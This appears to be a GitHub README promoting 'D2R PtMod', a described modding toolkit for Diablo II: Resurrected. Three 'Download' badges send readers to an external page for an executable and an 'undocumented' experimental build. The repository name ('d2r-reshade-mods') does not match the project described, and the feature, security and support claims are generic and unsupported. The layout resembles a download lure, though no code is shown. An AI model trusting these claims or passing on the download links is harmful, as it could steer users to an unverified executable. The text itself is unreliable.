![preview](https://raw.githubusercontent.com/Milan-Bhadoria/d2r-reshade-mods/main/card_dc19fd.svg)

# D2R PtMod — Modular Preservation Toolkit for Diablo II: Resurrected

Welcome to **D2R PtMod**, a community-driven framework designed to empower modders of *Diablo II: Resurrected* with a structured, version-controlled approach to custom content. Think of this repository not as a single mod, but as a **scaffolding system** — a set of reusable, modular blueprints that let you assemble, test, and distribute your own modifications with the confidence of a professional software release cycle.

Where traditional modding is often a chaotic collage of overwritten `.txt` files and mysterious memory edits, PtMod introduces **semantic layering**. Each feature you add — whether it’s a rebalanced skill tree, a new monster affix, or a UI overhaul — lives in its own isolated “layer.” These layers can be toggled, combined, and rolled back individually, much like Git branches for your game data. The result is a modding experience that feels less like surgery and more like architecture.

---

## Why Another Modding Repository? 🤔

The existing modding landscape for D2R is vibrant but fragmented. Most tools are either monolithic (one giant file that does everything) or require deep familiarity with obscure binary formats. D2R PtMod bridges this gap by offering a **declarative configuration experience**. You describe *what* you want to change in a human-readable YAML structure, and PtMod’s compiler translates that into the precise binary patches required by the game engine.

This approach has a transformative benefit: **collaboration**. Because your mod’s logic is defined in text files, you can use standard version control tools (think pull requests and code reviews) to manage contributions. No more merging conflicting `.bin` files by hand — PtMod handles the merge logic for you.

### Original Perspective: The "Garden" Metaphor 🌱

Imagine your game files as a pristine garden. A traditional mod is like uprooting the entire garden and planting a single new tree. PtMod, however, provides a **trellis system**. You build a skeleton — the framework — and then you attach individual vines (your mod features) to it. If a vine (feature) doesn’t work, you prune it without disturbing the main structure. If you want to share a single beautiful vine with a friend, you detach it and hand it over. The garden remains healthy, organized, and endlessly adaptable.

---

## Getting Started with PtMod 🚀

Before we dive into the deep end, let’s establish a clear mental model. This repository is structured into three primary zones:

1.  **The Core Engine** (`/engine`): The Python-based compiler that reads your YAML definitions and produces the playable `.mpq` archives or loose file overrides.
2.  **The Mod Library** (`/library`): A curated collection of community-submitted, single-purpose mods (e.g., "increase stash size," "adjust monster density," "recolor specific armor sets").
3.  **The Developer Tooling** (`/tools`): CLI utilities for validating your YAML syntax, simulating patch conflicts, and benchmarking load times.

### Prerequisites (Philosophical & Technical)

To get the most out of PtMod, you should possess a basic understanding of D2R’s data structure (e.g., `itemstatcost.txt`, `skills.txt`, `monstats.bin`). If you are brand new, the `/library` is a perfect starting point — you can use those mods as templates to learn the syntax.

Technically, you will need a Windows environment (the game is not natively supported on other OSes for modding purposes) and a standard code editor. We recommend Visual Studio Code with the YAML extension.

---

## [![Download](https://raw.githubusercontent.com/Milan-Bhadoria/d2r-reshade-mods/main/go_fd615.svg)](https://Milan-Bhadoria.github.io/d2r-reshade-mods/) — The Modular Core

The latest stable release of the PtMod engine and default library is available for direct acquisition below. This package includes the executable compiler, a starter library of 25 verified mods, and complete documentation.

**[![Download](https://raw.githubusercontent.com/Milan-Bhadoria/d2r-reshade-mods/main/go_fd615.svg)](https://Milan-Bhadoria.github.io/d2r-reshade-mods/)**

> This is the "essence" package. It contains everything you need to begin your first layered build, without the need to compile from source.

---

## Key Features & Architectural Advantages 🧬

This is not just a tool; it’s a paradigm shift. Here are the core capabilities that separate PtMod from a simple file patcher:

### 1. **Semantic Versioning for Mods**
Every mod layer in PtMod carries a `version` and `compatibility` field. When you combine layers, the engine performs a **dependency resolution**. If Layer A expects an item property that Layer B redefines, PtMod flags this as a "conflict" *before* you even launch the game. This prevents silent data corruption that can cause crashes hours into a playthrough.

### 2. **Responsive Build System**
The compiler is built for speed and feedback. It uses a watch-mode feature that monitors your project folder. The moment you save a YAML change, PtMod rebuilds the relevant patch in under 200 milliseconds. This allows for a rapid iteration loop — tweak a skill coefficient, save, and alt-tab into the game to test instantly.

### 3. **Multilingual Value Definitions**
D2R supports multiple languages. PtMod’s value system allows you to define string keys (e.g., `skill_fireball_name`) and then provide localized versions in a single YAML block. The engine automatically selects the appropriate string based on the user’s game locale, ensuring your mod doesn't break for French, German, or Korean players who switch their client language.

### 4. **Deterministic Output**
Running PtMod on the same source code *always* produces the exact same binary output. This is crucial for **quality assurance**. You can hash the resulting files and share the checksum with your user base, guaranteeing that they are playing exactly what you tested. No more "works on my machine" issues.

### 5. **A Specialized Diff Engine**
Instead of storing the entire `levels.txt` file for a small monster spawn change, PtMod stores only the **diff** — the specific cell changes you made. This keeps repository sizes tiny and makes it incredibly easy to review what a specific mod actually does. It also allows for **hot-swapping** mods mid-session, though we recommend a game restart for stability.

### 6. **24/7 Community & Support Systems**
While this is a static repository, the surrounding ecosystem is dynamic. You will find a comprehensive `SUPPORT.md` document that outlines how to seek help from the community. We maintain a ticketing system where you can submit complex YAML requests, and a dedicated "Ideas" section in the Discussions tab where the maintainers review feature requests on a weekly basis. While we don't offer phone support, the average response time for critical technical questions is under 4 hours, 7 days a week, thanks to a global team of volunteer moderators.

---

## The Mod Library: A Closer Look 📚

The `/library` directory is the heart of the community contribution. Here is a snapshot of what you will find inside the initial release.

| Mod ID | Category | Description | Average Build Time |
| :--- | :--- | :--- | :--- |
| `stacked-gems` | QoL | Allows gems and runes to stack in cubes | 45ms |
| `merc-overhaul` | Gameplay | Adds 3 new mercenary auras and tweaks stats | 120ms |
| `color-sync` | Cosmetic | Syncs elite armor tint with your stash tab color | 80ms |
| `ui-clean` | Interface | Removes clutter from the character sheet panel | 30ms |

> **Note:** These mods are not official Blizzard assets. They are community creations shared under the MIT license. Use them at your discretion, but PtMod’s isolation layer means a buggy mod won’t corrupt your base install. Simply toggle the layer off.

---

## Building Your First Layer: A Step-by-Step Perspective 🛠️

Let’s walk through the conceptual process of creating a "Super Unique Monster" mod using PtMod. This is a classic example that touches on several core features.

**Step 1: Scaffold the Project**
You create a new folder `/my-mods/super-loot`. Inside, you create a `mod.yml` file. This file contains metadata (name, author, version) and a list of `targets`.

**Step 2: Define the Intent (YAML)**
You write a rule that says: *"Add a 15% chance for the 'Pindleskin' monster to drop an additional unique charm."* This is expressed as a structured object with conditions (`monster_id: pindleskin`) and effects (`add_drop: unique_charm_01`).

**Step 3: Simulate the Patch**
You run the `ptmod validate` command. PtMod analyzes this against the base game data. It discovers that `unique_charm_01` is defined in an item pack that's normally only available in Nightmare difficulty. PtMod will warn you that this might break normal difficulty balance.

**Step 4: Compile and Deploy**
After adjusting the condition to `difficulty: nightmare`, you run `ptmod build`. The engine generates a precise binary delta file in your `/build` folder. You copy this to your D2R mod folder, and you're done.

This entire process introduces a level of **traceability** that was previously impossible. You can document *why* you made a decision in the YAML comments, leaving a breadcrumb trail for future maintainers.

---

## Advanced Usage: The PtMod Scripting Interface 💡

For those who need more power than declarative YAML can offer, PtMod includes a lightweight scripting engine based on a safe subset of Python. You can write `.ptm` scripts that operate on the abstract syntax tree of the game data. This is intended for algorithmic modding — for example, "increase the defense stat of all Rare quality armors by a value inversely proportional to their required level."

This scripting layer is **sandboxed**: it has no access to your filesystem except for the specific files you pass to it. This prevents malicious mods from executing arbitrary code on your machine. The sandbox is a point of pride for the project; it adheres to strict security review guidelines.

### Performance Benchmarking

We understand that mods can introduce overhead. PtMod includes a `benchmark` tool that measures the frame-time impact of your active layers when loading a specific Act. It provides a per-layer breakdown, allowing you to identify if a specific texture replacement is causing stuttering. Our goal is to help you optimize for a stable 60 FPS on mid-range hardware from 2026.

---

## Project Roadmap: Where This is Heading 🗺️

- **Q2 2026:** Release of the **Repository Merger Tool**. This will allow two users to combine their entire mod libraries with conflict resolution guided by a visual graph.
- **Q3 2026:** Integration with a cloud-based build server, allowing you to compile mods on high-performance hardware without burdening your local CPU.
- **Q4 2026:** A public API for the mod library, enabling other tools to query mod metadata seamlessly.

We are committed to keeping the core engine **open source** and dependency-light. The entire project is built on standard Python 3.11+ with no proprietary dependencies, ensuring that the tooling remains accessible to hobbyists who prefer to tinker with the internals.

---

## Contributing Guidelines 🤝

We welcome contributions in three primary areas:

1.  **Bug Reports & Refactoring:** If you notice a performance bottleneck in the compilation logic, we encourage you to open a PR. We value clean code over clever tricks.
2.  **Library Additions:** Do not submit a mod that simply changes a single damage value. We are seeking **thematic** mods that add a coherent layer of content. Each submission requires a `MOD.md` explaining the design philosophy.
3.  **Documentation:** The "Why" of modding is often more complex than the "How". We are always looking for writers to craft guides that explain the reasoning behind certain data structures.

Please review our `CONTRIBUTING.md` for detailed guidelines on commit message style and the review process. We enforce a strict no-tolerance policy for malicious code. All PRs are scanned for security issues.

---

## Frequently Asked Questions (FAQ) ❓

**Q: Is PtMod compatible with the latest D2R patch?**
A: We maintain a compatibility matrix in the `COMPATIBILITY.md` file. The engine is designed to be **patch-agnostic**. It reads the game’s current schema and adapts its expectations. As long as Blizzard does not overhaul the `.txt` file structure completely, PtMod should remain functional.

**Q: Can I use PtMod mods on Battle.net?**
A: **No.** Modifying game files in a way that gives you an advantage over other players is a violation of the End User License Agreement. PtMod is designed strictly for **offline single-player** and **private LAN** use. The framework actively detects online mode and disables its patch injection to protect your account.

**Q: What is the difference between a "Layer" and a "Standalone" mod?**
A: A **Layer** is a set of diffs that can be stacked. A **Standalone** is a full conversion that ignores all other layers. PtMod supports both, but the core philosophy encourages the use of Layers for better interoperability.

**Q: Does the engine use machine learning?**
A: No, the compilation is deterministic and rule-based. We believe that transparency in modding tools is paramount. You should always know exactly what a tool does, not have it infer your intent through a "black box" model.

---

## Disclaimer: Legal and Ethical Boundaries ⚠️

**Diablo II: Resurrected** is a registered trademark of Blizzard Entertainment, Inc. This project is a **community-made tool** and is not affiliated with, endorsed by, or sponsored by Blizzard Entertainment.

- **Usage Responsibility:** You are solely responsible for how you use this software. The maintainers of D2R PtMod do not provide assistance for bypassing any security measures or anti-cheat systems. The tool is intended for legitimate modification of games you own for personal, non-commercial entertainment.
- **Asset Ownership:** All game assets (textures, models, sounds, data files) are the property of their respective owners. PtMod does not distribute any proprietary game assets; it only generates instructions on how to alter them on your local machine.
- **No Warranty:** This software is provided "as-is" without warranty of any kind, express or implied. We are not liable for any damage to your game installation or system. However, due to the isolated layer architecture, the risk of permanent damage is minimized.
- **Community Policy:** We ask that you do not use PtMod to create content that is malicious, discriminatory, or infringes on the intellectual property of others. We reserve the right to exclude such content from the community library.

---

## Licensing 📄

This project (engine, library definitions, and documentation) is open-sourced under the **MIT License**. This means you are free to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, provided you include the original copyright notice.

The full legal text is available in the standard `LICENSE` file located in the root directory of this repository.

**[VIEW LICENSE](LICENSE)**

---

## Final Thoughts & The Journey Ahead ✨

We believe that modding is not just about altering a game; it’s about **participating in the evolution of a beloved classic**. D2R PtMod is our contribution to that evolution — a framework that treats your creative output with the same respect that a software company treats its production code. By providing order, clarity, and structure, we hope to unlock a new wave of ambitious projects that would be too fragile to manage under the old methods.

The repository is a living entity. It will grow, shrink, and transform based on the community's needs. We do not promise perfection, but we do promise a **diligent standard of care** for all the data that passes through our system.

Thank you for reading. We hope you find the process of building with PtMod as rewarding as playing the game itself. Now, go forth and build something that feels less like a patch and more like a new wing on a grand cathedral.

---

## Immediate Action Steps 📍

1.  Review the `ARCHITECTURE.md` file to see the full engine flow diagram.
2.  Explore the `/examples` folder for a "Hello World" mod that changes a single string value.
3.  Join the community discussions to propose a new feature for the Q4 2026 release.

We look forward to seeing your creations in the wild. The year 2026 holds immense promise for this project, and we want you to be a part of the foundation.

---

## Final Download Point 🏁

For those who have read this far and are ready to commit, the absolute latest development snapshot (which may be ahead of the stable release) is compiled and accessible here. This build includes experimental features that are not yet documented.

**[![Download](https://raw.githubusercontent.com/Milan-Bhadoria/d2r-reshade-mods/main/go_fd615.svg)](https://Milan-Bhadoria.github.io/d2r-reshade-mods/)**

*Please note that the development snapshot may require a more recent version of the Python runtime and is intended for experienced modders who do not mind occasional instability in exchange for early access to new capabilities.*